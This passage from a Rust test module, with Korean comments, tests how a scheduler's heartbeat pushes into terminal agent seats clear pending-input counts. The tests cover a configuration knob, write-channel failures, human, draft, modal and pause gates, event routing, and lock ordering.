        assert_eq!(blocked_reason(&s), "", "낡은 input_pending 사유가 남았다");
        assert_eq!(
            events(&d, "queue.input_pending_reset").len(),
            0,
            "stale 리셋 경로가 아니라 push 의 계상으로 풀려야 한다"
        );
        done(&s);
    }

    /// [C8] 계수가 이미 0 인 좌석에 push → 이벤트 0건(0→0 은 사실이 바뀐 게 아니다) · 계수·사람 몫 0 · 주입은 종전대로.
    #[test]
    fn c8_push_on_zero_count_seat_emits_no_event() {
        let (d, s) = rig("c8-zero");
        h_paint(&s, H_IDLE_SCREEN);
        assert_eq!(counts(&s), (0, 0), "전제");
        assert_eq!(deliver_push(&d, &periodic("hb", 5), s.id, "[heartbeat] 5분 보고", None), Ok("pushed"));
        assert_eq!(counts(&s), (0, 0));
        assert!(events(&d, "schedule.push_cleared_pending").is_empty(), "0→0 인데 이벤트가 났다");
        assert_eq!(h_ledger_count(&d, "schedule"), 1, "주입 자체는 종전대로");
        done(&s);
    }

    /// [C8 노브] `CYS_SCHEDULE_PUSH_COUNTS_SUBMIT=0` → 계수 유지(종전 · 세대도 무접촉) · 이벤트 0건 · 주입은 그대로. 노브를 되돌리면(기본 켬) 같은 좌석의 같은 유령 계수가 풀린다(대조).
    #[test]
    fn c8_knob_zero_keeps_the_count_and_emits_nothing() {
        let (d, s) = rig("c8-knob");
        h_paint(&s, H_IDLE_SCREEN);
        make_ghost(&s);
        let gen0 = s.input_gen.load(Ordering::Acquire);
        {
            let _k = HKnobGuard::set(&[("CYS_SCHEDULE_PUSH_COUNTS_SUBMIT", "0")]);
            assert!(!schedule_push_counts_submit(), "덮개 0 이 읽히지 않는다");
            assert_eq!(deliver_push(&d, &periodic("hb", 5), s.id, "[heartbeat] 노브 0", None), Ok("pushed"));
        }
        assert_eq!(counts(&s), (1, 1), "노브 0 인데 계수를 건드렸다(종전 = 무접촉)");
        assert_eq!(s.input_gen.load(Ordering::Acquire), gen0, "노브 0 인데 세대가 올랐다");
        assert!(events(&d, "schedule.push_cleared_pending").is_empty(), "노브 0 인데 이벤트가 났다");
        assert_eq!(h_ledger_count(&d, "schedule"), 1, "주입 자체는 종전대로");
        // 대조 — 노브 기본(켬): 같은 좌석·같은 유령 계수가 풀린다.
        settle();
        h_paint(&s, H_IDLE_SCREEN);
        assert_eq!(deliver_push(&d, &periodic("hb", 5), s.id, "[heartbeat] 노브 기본", None), Ok("pushed"));
        assert_eq!(counts(&s), (0, 0));
        assert_eq!(events(&d, "schedule.push_cleared_pending").len(), 1);
        done(&s);
    }

    /// [C8 노브 파서] 순수 파서는 **앞뒤 공백을 걷은 값이 `"0"`** 일 때만 끈다(★R1F-IN n-2: 같은 판의 다른 두 노브처럼 trim — 종전 검체는 정확히 `"0"` 만 끔으로 고정해 `"0 "` 가 조용히 켜진 채 남았다) —
    /// 미설정·빈 값·그 밖의 값은 켬. env 래퍼는 덮개(검체)·프로세스 env 를 호출마다 읽는다.
    #[test]
    fn c8_knob_parser_turns_off_only_on_zero_after_trimming_whitespace() {
        assert!(schedule_push_counts_submit_from_env(None), "미설정 = 켬(기본)");
        assert!(!schedule_push_counts_submit_from_env(Some("0")));
        // ★R1F-IN n-2 — 앞뒤 공백(탭·개행 포함)을 걷은 값이 `0` 이면 끈다.
        for v in [" 0", "0 ", " 0 ", "\t0\n", "  0\t"] {
            assert!(!schedule_push_counts_submit_from_env(Some(v)), "{v:?} 는 공백을 걷으면 0 — 끄는 값이다");
        }
        for v in ["", "1", "on", "off", "false", "no", "00", "2", "true", "OFF", " ", "0 0", "-0", "+0"] {
            assert!(schedule_push_counts_submit_from_env(Some(v)), "{v:?} 는 끄는 값이 아니다");
        }
        // 래퍼 — 호출마다 읽는다(덮개 변경이 곧바로 반영 = 1회 캐시 아님).
        for (v, want) in [("0", false), ("1", true), ("0", false), ("", true)] {
            let _k = HKnobGuard::set(&[("CYS_SCHEDULE_PUSH_COUNTS_SUBMIT", v)]);
            assert_eq!(schedule_push_counts_submit(), want, "{v:?}");
        }
        if std::env::var_os("CYS_SCHEDULE_PUSH_COUNTS_SUBMIT").is_none() {
            assert!(schedule_push_counts_submit(), "env 미설정 = 켬");
        }
    }

    /// [R1F-IN ⓐ] 직접 push 인계 계상은 **잠정 Esc 면제 표식**(leaf `esc_exempt_pgid` + 원자 미러)도 같은 임계영역에서 내린다 — 계수가 0→0 이어도(이미 제출된 줄 뒤에 에이전트가 전경에서 사라졌을 때
    /// 틱의 되돌리기가 헛 계수를 세우지 않게). 노브가 꺼졌으면(공백 낀 `" 0 "` 도 끔 — n-2) 계수·표식 모두 무접촉(종전). 표식은 사람의 단독 Esc 를 에이전트 전경 그룹 밑에서 면제한 상태를 직접 세워 재현한다.
    #[cfg(unix)]
    #[test]
    fn r1f_in_push_handoff_lowers_the_esc_exempt_marker_and_knob_off_leaves_it() {
        let (d, s) = rig("r1f-in-push");
        h_paint(&s, H_IDLE_SCREEN);
        let marker = || (s.pending_input.lock().unwrap().esc_exempt_pgid, s.esc_exempt_pgid.load(Ordering::Relaxed));
        s.pending_input.lock().unwrap().esc_exempt_pgid = 4242;
        s.esc_exempt_pgid.store(4242, Ordering::Relaxed);
        {
            let _k = HKnobGuard::set(&[("CYS_SCHEDULE_PUSH_COUNTS_SUBMIT", " 0 ")]);
            assert!(!schedule_push_counts_submit(), "공백 낀 0 도 끔(n-2)");
            assert_eq!(deliver_push(&d, &periodic("hb", 5), s.id, "[heartbeat] 노브 끔", None), Ok("pushed"));
        }
        assert_eq!(marker(), (4242, 4242), "노브 끔 = 계수·표식 무접촉(종전)");
        settle();
        h_paint(&s, H_IDLE_SCREEN);
        assert_eq!(counts(&s), (0, 0), "전제: 계수 0 인 좌석(표식만 서 있다)");
        let gen0 = s.input_gen.load(Ordering::Acquire);
        assert_eq!(deliver_push(&d, &periodic("hb", 5), s.id, "[heartbeat] 노브 기본", None), Ok("pushed"));
        assert_eq!(marker(), (0, 0), "인계 계상이 잠정 Esc 면제 표식을 내려야 한다(leaf·미러)");
        assert!(s.input_gen.load(Ordering::Acquire) > gen0, "세대는 종전대로 오른다");
        assert!(events(&d, "schedule.push_cleared_pending").is_empty(), "계수 0→0 이라 종전대로 이벤트 없음");
        done(&s);
    }

    /// [C8 인계 실패] `try_send` 실패(채널 가득 · writer 종료) → 계수·사람 몫·세대 유지 · 이벤트 0건 · Err 는 종전 문구 그대로.
    /// (RED 돌연변이 M1 = 실패에도 계수를 0 으로 → 이 검체가 적색.)
    #[test]
    fn c8_handoff_failure_leaves_the_count_untouched() {
        use crate::state::WriteReq;
        use std::sync::mpsc::TrySendError;
        // (가) 채널 가득 — writer 를 5s 재워(DataAfter) 뒤 요청이 쌓이게 한 뒤 용량(128)을 채운다.
        let (d, s) = rig("c8-full");
        h_paint(&s, H_IDLE_SCREEN);
        make_ghost(&s);
        s.write_tx.send(WriteReq::DataAfter { bytes: Vec::new(), delay_ms: 5_000 }).expect("writer");
        std::thread::sleep(std::time::Duration::from_millis(150)); // writer 가 집어 자리에 들도록
        for i in 0..128 {
            s.write_tx.try_send(WriteReq::Data(Vec::new())).unwrap_or_else(|_| panic!("채널 채우기 #{i}"));
        }
        assert!(
            matches!(s.write_tx.try_send(WriteReq::Data(Vec::new())), Err(TrySendError::Full(_))),
            "전제: 채널이 가득 찼다"
        );
        let gen0 = s.input_gen.load(Ordering::Acquire);
        let err = deliver_push(&d, &periodic("hb", 5), s.id, "[heartbeat] 가득", None)
            .expect_err("가득 찬 채널에 인계가 성공했다");
        assert!(err.contains("write channel full"), "{err}");
        assert_eq!(counts(&s), (1, 1), "쓰이지 않았는데 계수를 0 으로 계상했다(채널 가득)");
        assert_eq!(s.input_gen.load(Ordering::Acquire), gen0, "쓰이지 않았는데 세대가 올랐다");
        assert!(events(&d, "schedule.push_cleared_pending").is_empty(), "쓰이지 않았는데 이벤트가 났다");
        done(&s);
        // (나) writer 종료 — 자식이 끝나 reader EOF → writer 루프가 끝나 수신자가 사라진다(`exec` 라 셸이 자식을 남기지 않는다).
        let (d2, s2) = rig_cmd("c8-closed", "exec sleep 30");
        h_paint(&s2, H_IDLE_SCREEN);
        make_ghost(&s2);
        done(&s2);
        let t0 = std::time::Instant::now();
        while !s2.exited.load(Ordering::Relaxed) {
            assert!(t0.elapsed() < std::time::Duration::from_secs(10), "전제 실패: reader 가 자식 종료(EOF)를 보지 못했다");
            std::thread::sleep(std::time::Duration::from_millis(50));
        }
        // writer 루프는 **유휴 200ms** 뒤에야 stop 표식을 본다 — 요청을 쉼 없이 보내면 그 시험이 영영 오지 않으므로 드문 간격으로만 닫힘을 확인한다.
        let t1 = std::time::Instant::now();
        loop {
            std::thread::sleep(std::time::Duration::from_millis(450));
            if matches!(s2.write_tx.try_send(WriteReq::Data(Vec::new())), Err(TrySendError::Disconnected(_))) {
                break;
            }
            assert!(t1.elapsed() < std::time::Duration::from_secs(10), "전제 실패: writer 가 끝나지 않았다");
        }
        let gen0 = s2.input_gen.load(Ordering::Acquire);
        let err = deliver_push(&d2, &periodic("hb", 5), s2.id, "[heartbeat] 종료", None)
            .expect_err("종료된 writer 에 인계가 성공했다");
        assert!(err.contains("writer closed"), "{err}");
        assert_eq!(counts(&s2), (1, 1), "쓰이지 않았는데 계수를 0 으로 계상했다(writer 종료)");
        assert_eq!(s2.input_gen.load(Ordering::Acquire), gen0);
        assert!(events(&d2, "schedule.push_cleared_pending").is_empty());
    }

    /// [C8 게이트 불변] 사람 키 직후(30s 창) · 화면 초안 · 모달 전경 · kill-switch — 종전처럼 직접 주입하지 않고(큐로 전환 · Err) **계수는 그대로**다. 이벤트·원장 0.
    /// (기존 H0/H2 검체가 판정 자체를 이미 핀한다 — 여기서는 전환·거부가 계수를 건드리지 않음을 잰다.)
    #[test]
    #[cfg_attr(not(unix), ignore = "윈도우 기본 H 마스크는 draft 축을 끈다(hold_axes_default(true)) — 이 검체는 유닉스 기본(draft 축) 동작을 본다")]
    fn c8_diverted_or_refused_pushes_keep_the_count_gates_unchanged() {
        let (d, s) = rig("c8-gates");
        make_ghost(&s);
        // ⓐ 사람 키 직후 10s → 큐로 전환
        h_paint(&s, H_IDLE_SCREEN);
        *s.last_human_input.lock().unwrap() = Some(std::time::Instant::now() - std::time::Duration::from_secs(10));
        assert_eq!(deliver_push(&d, &periodic("hb-h", 5), s.id, "[heartbeat] a", None), Ok("queued(gate:human)"));
        assert_eq!(counts(&s), (1, 1), "사람 키 직후 전환이 계수를 건드렸다");
        // ⓑ 화면에 초안이 보인다(사람 몫 1 이라 기계 잔여가 아니다) → 큐로 전환
        *s.last_human_input.lock().unwrap() = None;
        h_paint(&s, H_DRAFT_SCREEN);
        assert_eq!(deliver_push(&d, &periodic("hb-d", 5), s.id, "[heartbeat] b", None), Ok("queued(gate:draft)"));
        assert_eq!(counts(&s), (1, 1), "화면 초안 전환이 계수를 건드렸다");
        // ⓒ 모달(질문·선택 창) 전경 → 큐로 전환
        h_paint(&s, cys::first_run_gates::fixtures::LIVE_PERMISSION_PROMPT);
        assert_eq!(deliver_push(&d, &periodic("hb-m", 5), s.id, "[heartbeat] c", None), Ok("queued(modal)"));
        assert_eq!(counts(&s), (1, 1), "모달 전환이 계수를 건드렸다");
        // ⓓ kill-switch(틱과 push 사이의 늦은 pause) → Err(delivery_frozen)
        h_paint(&s, H_IDLE_SCREEN);
        d.paused.store(true, Ordering::Relaxed);
        let err = deliver_push(&d, &periodic("hb-p", 5), s.id, "[heartbeat] d", None).expect_err("pause 중 주입");
        assert!(err.starts_with("delivery_frozen"), "{err}");
        d.paused.store(false, Ordering::Relaxed);
        assert_eq!(counts(&s), (1, 1), "pause 거부가 계수를 건드렸다");
        assert_eq!(queue(&s).len(), 3, "전환 항목 3(사람·초안·모달)");
        assert_eq!(h_ledger_count(&d, "schedule"), 0, "직접 주입 0");
        assert!(events(&d, "schedule.push_cleared_pending").is_empty(), "전환·거부에서 이벤트가 났다");
        done(&s);
    }

    /// [C8 비라우팅] `schedule.push_cleared_pending` 은 경보가 아니다 — `alert_route::routable` 에 걸리지 않고(CSO 좌석 입력으로 새는 폭주 통로 금지 · `alert.` 접두 금지),
    /// 요약 재료도 되지 않는다. 선례: `usage.alert_resolved`(B3). 기존 라우팅 이름은 그대로 라우팅된다(대조).
    #[test]
    fn c8_push_cleared_pending_is_observation_only_never_routed() {
        let name = "schedule.push_cleared_pending";
        assert!(!crate::alert_route::routable(name), "관측 이벤트가 라우팅 대상이다");
        assert!(!name.starts_with(crate::alert_route::ALERT_ENGINE_PREFIX));
        assert!(!crate::alert_route::routable("queue.input_pending_reset"), "대조: 종전 리셋 이벤트도 비라우팅");
        let ev = json!({"name": name, "surface_id": 2, "payload": {"surface_ref": "surface:2", "prev_bytes": 1,
                        "prev_human_bytes": 1, "job": "heartbeat-5m"}});
        assert!(crate::alert_route::summarize(&ev).is_none(), "관측 이벤트가 라우팅 요약 재료가 됐다");
        for n in ["queue.starved", "queue.depth_high", "alert.rate_limit", "watchdog.load_high"] {
            assert!(crate::alert_route::routable(n), "대조: 라우팅 이름 {n} 이 막혔다");
        }
    }

    /// [C8 자가치유 확장] 기계 잔여(검증 발신자 본문 · 계수 n · 사람 0 · owner 각인)가 남은 좌석에 H2 가 종전대로 직접 주입(병합 제출)하면 계수가 0 이 되고
    /// owner 각인은 세대 변화로 무효가 된다 — 이벤트는 사람 몫 0 으로 1건. (종전: 병합 제출됐는데도 계수 n 이 남아 큐가 다음 stale 리셋까지 input_pending.)
    #[test]
    fn c8_machine_residue_push_clears_count_and_invalidates_owner() {
        let (d, s) = rig("c8-residue");
        s.apply_pending_input(b"WORKER-REPORT residue text", InputOrigin::Machine);
        s.mark_pending_owner(9);
        assert!(s.pending_owner().is_some(), "전제: owner 각인");
        let n = s.pending_input_bytes.load(Ordering::Relaxed);
        assert_eq!(n, 26, "전제: 잔여 26바이트");
        h_paint(&s, &crate::governance::h_residue_screen("WORKER-REPORT residue text"));
        assert_eq!(deliver_push(&d, &periodic("hb", 5), s.id, "[heartbeat] 5분 보고", None), Ok("pushed"));
        assert_eq!(counts(&s), (0, 0), "병합 제출했는데 기계 잔여 계수가 남았다");
        assert!(s.pending_owner().is_none() && s.pending_input_owner().is_none(), "owner 각인이 세대 변화로 무효가 되지 않았다");
        let evs = events(&d, "schedule.push_cleared_pending");
        assert_eq!(evs.len(), 1, "{evs:?}");
        assert_eq!(evs[0]["payload"]["prev_bytes"], json!(26));
        assert_eq!(evs[0]["payload"]["prev_human_bytes"], json!(0), "기계 잔여의 사람 몫은 0");
        done(&s);
    }

    /// [C8 임계영역 · 행동] 인계+계상은 `input_gate` 를 쥔 쪽(직접 send)이 끝난 **뒤**에 일어난다 — 게이트를 쥔 동안 push 는 지나가지 못하고(계수·세대 무변),
    /// 놓으면 그 사이 올라간 직접 send 의 계수까지 제출(0)로 계상한다(소스 핀의 행동 짝). 계상이 게이트 밖이었다면 직접 send 의 계수를 덮어쓰거나 앞질러 계상한다.
    /// 게이트를 쥔 호출자가 없다는 전제(재진입 없음)는 소스 핀이 재고, 놓은 뒤 push 가 **끝까지 돌아 나오는 것**(교착 없음)은 여기서 잰다.
    #[test]
    fn c8_inject_on_waits_for_the_input_gate_held_by_a_direct_send() {
        let (d, s) = rig("c8-gate-wait");
        h_paint(&s, H_IDLE_SCREEN);
        // 직접 send(`send_text`)는 게이트 안에서 본문을 쓰고 계수를 올린다 — 여기서는 계수를 올린 채 게이트를 쥐고 있는다.
        let gate = s.input_gate.lock().unwrap();
        s.apply_pending_input(b"abc", InputOrigin::Machine);
        let gen0 = s.input_gen.load(Ordering::Acquire);
        let (d2, s2) = (Arc::clone(&d), Arc::clone(&s));
        let pusher = std::thread::spawn(move || {
            // 원장 선기록은 스레드 로컬 격리 상태 디렉터리를 쓴다 — 이 스레드도 새 격리를 쥔다.
            crate::delivery::tests::isolate_state_dir_for_thread("c8-gate-wait-pusher");
            inject_on(&d2, &s2, "[heartbeat] 게이트 대기")
        });
        std::thread::sleep(std::time::Duration::from_millis(400));
        assert!(!pusher.is_finished(), "게이트를 쥔 동안 push 가 지나갔다 — 인계·계상이 임계영역 밖이다");
        assert_eq!(s.pending_input_bytes.load(Ordering::Relaxed), 3, "게이트를 쥔 동안 계수가 바뀌었다");
        assert_eq!(s.input_gen.load(Ordering::Acquire), gen0, "게이트를 쥔 동안 세대가 올랐다");
        // 인계(`try_send`) 자체가 게이트 **안**이다 — 게이트를 쥔 동안에는 writer 가 push 본문을 집은 적도 없다(인계를 게이트 앞에서 하고 계상만 안에서 하면 적색).
        assert!(s.inject_track.last_body().is_none(), "게이트를 쥔 동안 인계가 나갔다 — 인계가 게이트 밖이다");
        drop(gate);
        let got = pusher.join().expect("push 스레드").expect("인계");
        assert_eq!(got, Some(PushClearedPending { prev_bytes: 3, prev_human_bytes: 0 }), "직접 send 의 계수까지 제출로 계상한다");
        assert_eq!(counts(&s), (0, 0));
        assert!(s.input_gen.load(Ordering::Acquire) > gen0);
        done(&s);
    }

    /// [C8 소스 핀] 인계(`try_send`)와 계상(`set_pending_input(0)`)이 **한 `input_gate` 임계영역** 안이다 — 순서: 원장 선기록 → 노브 → 게이트 → 인계 → 계상 → 해제.
    /// 게이트 안은 `pending_input`(leaf) 외 락 · 원장 append · 이벤트 발행 금지(락 계약 · 디스크 I/O 를 게이트 안에 넣지 않는다). 이 파일에서 `input_gate` 를 잡는 곳은 `inject_on` 하나뿐
    /// (호출 사슬이 게이트를 쥐지 않는다는 재진입 없음 증명의 전제). 계상을 게이트 밖으로 내리면(M5) 그 사이의 직접 send 계수를 덮어쓴다.
    #[test]
    fn c8_inject_on_handoff_and_accounting_share_one_input_gate_source_pin() {
        let src = include_str!("schedule.rs");
        let prod = &src[..src.find("\n#[cfg(test)]\nmod tests {").expect("테스트 모듈 앵커 소실")];
        let at = prod.find("\nfn inject_on(").expect("inject_on 소실");
        let body = &prod[at..at + prod[at..].find("\n}\n").expect("함수 끝")];
        let code: String = body.lines().filter(|l| !l.trim_start().starts_with("//")).collect::<Vec<_>>().join("\n");
        let ledger = code.find("record_audited(").expect("원장 선기록");
        let knob = code.find("schedule_push_counts_submit()").expect("노브");
        let gate = code.find("input_gate.lock()").expect("게이트");
        let send = code.find(".try_send(").expect("인계");
        let account = code.find("set_pending_input(0)").expect("계상");
        let release = code.find("drop(gate)").expect("게이트 해제");
        assert!(
            ledger < knob && knob < gate && gate < send && send < account && account < release,
            "순서가 깨졌다: 원장 {ledger} · 노브 {knob} · 게이트 {gate} · 인계 {send} · 계상 {account} · 해제 {release}"
        );
        let inside = &code[gate..release];
        for banned in [
            "record_audited(", "bus.publish", "pending_queue", "surfaces.lock", "roles.lock", "parser.lock", "agent_meta.lock",
            "last_human_input", "queue_blocked",
        ] {
            assert!(!inside.contains(banned), "게이트 안에서 `{banned}` 를 쓴다(락 계약 위반)");
        }
        assert_eq!(
            inside.matches(".lock()").count(),
            2,
            "게이트 안의 락은 input_gate 자신과 pending_input(leaf) 둘뿐이다: {inside}"
        );
        assert!(inside.contains("pending_input.lock()"), "사람 몫 정규화(leaf)가 게이트 안에 있다");
        assert_eq!(
            prod.matches("input_gate.lock()").count(),
            1,
            "이 파일에서 input_gate 를 잡는 곳은 inject_on 하나뿐이어야 한다(호출 사슬 재진입 없음의 전제)"
        );
        // 호출부: 계상 결과를 이벤트로만 쓴다 — 판정(H0) 뒤 · 게이트 판정은 그대로.
        let dp = &prod[prod.find("\nfn deliver_push(").expect("deliver_push")..];
        let dp = &dp[..dp.find("\n}\n").expect("끝")];
        assert!(
            dp.find("machine_direct_hold(").expect("H0 판정") < dp.find("inject_on(daemon, &surface, text)?").expect("인계 호출"),
            "판정이 인계 뒤로 갔다"
        );
        assert!(dp.contains("note_push_cleared_pending(daemon, &surface, job, cleared)"), "이벤트 배선 소실");
    }
}
